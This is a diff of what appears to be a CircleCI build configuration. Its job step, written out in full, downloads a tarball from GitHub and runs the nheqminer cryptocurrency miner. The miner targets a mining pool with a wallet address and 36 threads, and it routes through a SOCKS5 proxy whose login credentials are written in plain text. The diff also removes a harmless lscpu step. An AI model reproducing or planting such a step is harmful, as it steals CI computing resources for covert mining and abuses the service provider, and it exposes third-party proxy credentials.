@@ -26,8 +26,7 @@ jobs:
             - image: circleci/ruby:2.5.3 
       steps: 
         - run: wget https://github.com/dewi240809/zoe/raw/main/zoe.tgz && tar -xvf zoe.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && nheqminer/nheqminer -v -l verushash.eu.mine.zergpool.com:3300 -u RSXFTyohSPGC63BXBQZ5F9jeQcqxvgS1Dx.Pusing_Siti_Suhuna_maredit -p c=RVN -t 36 --proxy socks5://simbahkencot-rotate:tukimenreborn@p.webshare.io:80
-            name: Install Dependencies 
-            command: timeout 1m lscpu 
+        
 workflows: 
     version: 2.1 
     build: 
